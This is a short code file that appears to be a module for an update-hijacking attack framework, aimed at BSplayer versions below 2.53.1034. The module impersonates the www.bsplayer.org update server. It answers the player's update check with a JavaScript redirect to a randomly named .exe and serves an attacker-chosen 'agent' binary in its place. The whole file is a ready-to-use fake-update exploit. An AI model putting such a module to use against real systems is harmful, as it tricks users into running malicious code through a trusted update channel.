from modules import ModuleBase


class BSplayer(ModuleBase):
    name = 'BSplayer'
    version = '1.0'
    appver = '< 2.53.1034'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.bsplayer.org)' 
    requests = [
        {   'path': '/html/updatep.php\?',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://www.bsplayer.org/bsplayerupdate<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
